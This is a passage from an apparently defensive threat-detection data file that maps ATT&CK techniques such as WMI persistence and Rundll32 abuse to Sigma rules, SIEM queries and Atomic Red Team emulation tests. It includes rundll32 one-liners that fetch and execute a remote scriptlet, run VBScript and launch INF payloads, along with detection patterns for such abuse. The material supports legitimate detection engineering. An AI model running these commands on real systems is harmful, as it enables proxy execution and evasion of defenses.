\"(EventID:\\\\\"11\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\scrcons.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Persistence - Script Event Consumer File Write\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND Image:\"C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" Image=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" Image=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Backdoor Exchange Transport Agent\nid: 797011dc-44f4-4e6f-9f10-a8ceefbe566b\nstatus: experimental\ndescription: Detects a WMi backdoor in Exchange Transport Agents via WMi event filters\nauthor: Florian Roth\ndate: 2019/10/11\nreferences:\n    - https://twitter.com/cglyer/status/1182389676876980224\n    - https://twitter.com/cglyer/status/1182391019633029120\nlogsource:\n    category: process_creation\n    product: windows\ntags:\n    - attack.persistence\n    - attack.t1084\ndetection:\n    selection: \n        ParentImage: '*\\EdgeTransport.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Backdoor Exchange Transport Agent\nid: 797011dc-44f4-4e6f-9f10-a8ceefbe566b\nstatus: experimental\ndescription: Detects a WMi backdoor in Exchange Transport Agents via WMi event filters\nauthor: Florian Roth\ndate: 2019/10/11\nreferences:\n    - https://twitter.com/cglyer/status/1182389676876980224\n    - https://twitter.com/cglyer/status/1182391019633029120\nlogsource:\n    category: process_creation\n    product: windows\ntags:\n    - attack.persistence\n    - attack.t1084\ndetection:\n    selection: \n        ParentImage: '*\\EdgeTransport.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "ParentImage.keyword:*\\\\\\\\EdgeTransport.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Backdoor-Exchange-Transport-Agent <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Backdoor Exchange Transport Agent\",\\n    \"description\": \"Detects a WMi backdoor in Exchange Transport Agents via WMi event filters\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1084\"\\n    ],\\n    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\EdgeTransport.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\EdgeTransport.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Backdoor Exchange Transport Agent\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "ParentImage.keyword:*\\\\\\\\EdgeTransport.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "ParentImage=\"*\\\\\\\\EdgeTransport.exe\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\EdgeTransport.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\EdgeTransport\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct\").Exec();\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "name": null}, {"source": "SysmonHunter - Rundll32", "command": "vbscript|javascript|http|https|.dll\\\\Windows\\\\.+\\\\rundll32.exe", "name": null}], "command_list": ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct\").Exec();\n", "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n", "rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "vbscript|javascript|http|https|.dll\\\\Windows\\\\.+\\\\rundll32.exe"], "technique_id": "T1085", "parsed_datasets": [{"Atomic Red Team Test - Rundll32": {"display_name": "Rundll32", "atomic_tests": [{"description": "Test execution of a remote script using rundll32.exe\n", "supported_platforms": ["windows"], "name": "Rundll32 execute JavaScript Remote Payload With GetObject", "input_arguments": {"file_url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct", "type": "Url", "description": "location of the payload"}}, "executor": {"elevation_required": false, "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();\n", "name": "command_prompt"}}, {"description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\n\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\n", "supported_platforms": ["windows"], "name": "Rundll32 execute VBscript command", "input_arguments": {"command_to_execute": {"default": "calc.exe", "type": "string", "description": "Command for rundll32.exe to execute"}}, "executor": {"elevation_required": false, "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "name": "command_prompt"}}, {"dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf\" -OutFile \"#{inf_to_execute}\"\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Rundll32 advpack.dll Execution", "executor": {"elevation_required": false, "command": "rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n", "name": "command_prompt"}, "description": "Test execution of a command using rundll32.exe with advpack.dll.\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\n", "input_arguments": {"inf_to_execute": {"default": "PathToAtomicsFolder\\T1085\\src\\T1085.inf", "type": "string", "description": "Local location of inf file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf\" -OutFile \"#{inf_to_execute}\"\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Rundll32 ieadvpack.dll Execution", "executor": {"elevation_required": false, "command": "rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n", "name": "command_prompt"}, "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n", "input_arguments": {"inf_to_execute": {"default": "PathToAtomicsFolder\\T1085\\src\\T1085.inf", "type": "string", "description": "Local location of inf file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Rundll32 syssetup.dll Execution", "executor": {"elevation_required": false, "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\#{inf_to_execute}\n", "name": "command_prompt"}, "description": "Test execution of a command using rundll32.exe with syssetup.dll.\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n", "input_arguments": {"inf_to_execute": {"default": "PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf", "type": "string", "description": "Local location of inf file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Rundll32 setupapi.dll Execution", "executor": {"elevation_required": false, "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\#{inf_to_execute}\n", "name": "command_prompt"}, "description": "Test execution of a command using rundll32.exe with setupapi.dll.\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n", "input_arguments": {"inf_to_execute": {"default": "PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf", "type": "string", "description": "Local location of inf file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1085"}}, {"SysmonHunter - T1085": {"phase": "Execution", "query": [{"process": {"cmdline": {"pattern": "vbscript|javascript|http|https|.dll"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\rundll32.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Rundll32", "level": "medium"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2025725", "Verified": "Yes", "Signature": "ET POLICY RunDll Request Over SMB - Likely Lateral Movement"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_parent_path contains \"\\\\rundll32.exe\"or process_path contains \"rundll32.exe\")", "product": "Azure Sentinel", "name": "Rundll32"}, {"query": "title: Rundll32 Internet Connection\nid: cdc8da7d-c303-42f8-b08c-b4ab47230263\nstatus: experimental\ndescription: Detects a rundll32 that communicates with public IP addresses\nreferences:\n    - https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100\nauthor: Florian Roth\ndate: 2017/11/04\ntags:\n    - attack.t1085\n    - attack.defense_evasion\n    - attack.execution\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\rundll32.exe'\n        Initiated: 'true'\n    filter:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.*'\n    condition: selection and not filter\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Rundll32 Internet Connection\nid: cdc8da7d-c303-42f8-b08c-b4ab47230263\nstatus: experimental\ndescription: Detects a rundll32 that communicates with public IP addresses\nreferences:\n    - https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100\nauthor: Florian Roth\ndate: 2017/11/04\ntags:\n    - attack.t1085\n    - attack.defense_evasion\n    - attack.execution\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\rundll32.exe'\n        Initiated: 'true'\n    filter:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.*'\n    condition: selection and not filter\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND Image.keyword:*\\\\\\\\rundll32.exe AND Initiated:\"true\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Rundll32-Internet-Connection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Rundll32 Internet Connection\",\\n    \"description\": \"Detects a rundll32 that communicates with public IP addresses\",\\n    \"tags\": [\\n      \"attack.t1085\",\\n      \"attack.defense_evasion\",\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND Initiated:\\\\\"true\\\\\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND Initiated:\\\\\"true\\\\\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Rundll32 Internet Connection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND Image.keyword:*\\\\\\\\rundll32.exe AND Initiated:\"true\") AND (NOT (DestinationIp.keyword:(10.* 192.168.* 172.16.* 172.17.* 172.18.* 172.19.* 172.20.* 172.21.* 172.22.* 172.23.* 172.24.* 172.25.* 172.26.* 172.27.* 172.28.* 172.29.* 172.30.* 172.31.* 127.*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" Image=\"*\\\\\\\\rundll32.exe\" Initiated=\"true\") NOT ((DestinationIp=\"10.*\" OR DestinationIp=\"192.168.*\" OR DestinationIp=\"172.16.*\" OR DestinationIp=\"172.17.*\" OR DestinationIp=\"172.18.*\" OR DestinationIp=\"172.19.*\" OR DestinationIp=\"172.20.*\" OR DestinationIp=\"172.21.*\" OR DestinationIp=\"172.22.*\" OR DestinationIp=\"172.23.*\" OR DestinationIp=\"172.24.*\" OR DestinationIp=\"172.25.*\" OR DestinationIp=\"172.26.*\" OR DestinationIp=\"172.27.*\" OR DestinationIp=\"172.28.*\" OR DestinationIp=\"172.29.*\" OR DestinationIp=\"172.30.*\" OR DestinationIp=\"172.31.*\" OR DestinationIp=\"127.*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" Image=\"*\\\\\\\\rundll32.exe\" Initiated=\"true\")  -(DestinationIp IN [\"10.*\", \"192.168.*\", \"172.16.*\", \"172.17.*\", \"172.18.*\", \"172.19.*\", \"172.20.*\", \"172.21.*\", \"172.22.*\", \"172.23.*\", \"172.24.*\", \"172.25.*\", \"172.26.*\", \"172.27.*\", \"172.28.*\", \"172.29.*\", \"172.30.*\", \"172.31.*\", \"127.*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*.*\\\\rundll32\\\\.exe)(?=.*true)))(?=.*(?!.*(?:.*(?=.*(?:.*10\\\\..*|.*192\\\\.168\\\\..*|.*172\\\\.16\\\\..*|.*172\\\\.17\\\\..*|.*172\\\\.18\\\\..*|.*172\\\\.19\\\\..*|.*172\\\\.20\\\\..*|.*172\\\\.21\\\\..*|.*172\\\\.22\\\\..*|.*172\\\\.23\\\\..*|.*172\\\\.24\\\\..*|.*172\\\\.25\\\\..*|.*172\\\\.26\\\\..*|.*172\\\\.27\\\\..*|.*172\\\\.28\\\\..*|.*172\\\\.29\\\\..*|.*172\\\\.30\\\\..*|.*172\\\\.31\\\\..*|.*127\\\\..*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Control Panel DLL Load\nid: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819\nstatus: experimental\ndescription: Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\nauthor: Florian Roth\ndate: 2017/04/15\nreferences:\n    - https://twitter.com/rikvduijn/status/853251879320662017\ntags:\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1085\n    - car.2013-10-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\System32\\control.exe'\n        CommandLine: '*\\rundll32.exe *'\n    filter:\n        CommandLine: '*Shell32.dll*'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Control Panel DLL Load\nid: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819\nstatus: experimental\ndescription: Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\nauthor: Florian Roth\ndate: 2017/04/15\nreferences:\n    - https://twitter.com/rikvduijn/status/853251879320662017\ntags:\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1085\n    - car.2013-10-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\System32\\control.exe'\n        CommandLine: '*\\rundll32.exe *'\n    filter:\n        CommandLine: '*Shell32.dll*'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\System32\\\\\\\\control.exe AND CommandLine.keyword:*\\\\\\\\rundll32.exe\\\\ *) AND (NOT (CommandLine.keyword:*Shell32.dll*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Control-Panel-DLL-Load <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Control Panel DLL Load\",\\n    \"description\": \"Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\",\\n      \"attack.t1085\",\\n      \"car.2013-10-002\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\control.exe AND CommandLine.keyword:*\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ *) AND (NOT (CommandLine.keyword:*Shell32.dll*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\control.exe AND CommandLine.keyword:*\\\\\\\\\\\\\\\\rundll32.exe\\\\\\\\ *) AND (NOT (CommandLine.keyword:*Shell32.dll*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Control Panel DLL Load\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:*\\\\\\\\System32\\\\\\\\control.exe AND CommandLine.keyword:*\\\\\\\\rundll32.exe *) AND (NOT (CommandLine.keyword:*Shell32.dll*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\System32\\\\\\\\control.exe\" CommandLine=\"*\\\\\\\\rundll32.exe *\") NOT (CommandLine=\"*Shell32.dll*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentImage=\"*\\\\\\\\System32\\\\\\\\control.exe\" CommandLine=\"*\\\\\\\\rundll32.exe *\")  -(CommandLine=\"*Shell32.dll*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\System32\\\\control\\\\.exe)(?=.*.*\\\\rundll32\\\\.exe .*)))(?=.*(?!.*(?:.*(?=.*.*Shell32\\\\.dll.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\ndescription: Detects suspicious process related to rundll32 based on arguments\nstatus: experimental\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nauthor: juju4\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\rundll32.exe* url.dll,*OpenURL *'\n            - '*\\rundll32.exe* url.dll,*OpenURLA *'\n            - '*\\rundll32.exe* url.dll,*FileProtocolHandler *'\n            - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *'\n            - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *'\n            - '*\\rundll32.exe javascript:*'\n            - '* url.dll,*OpenURL *'\n            - '* url.dll,*OpenURLA *'\n            - '* url.dll,*FileProtocolHandler *'\n            - '* zipfldr.dll,*RouteTheCall *'\n            - '* Shell32.dll,*Control_RunDLL *'\n            - '* javascript:*'\n            - '*.RegisterXLL*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\ndescription: Detects suspicious process related to rundll32 based on arguments\nstatus: experimental\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - 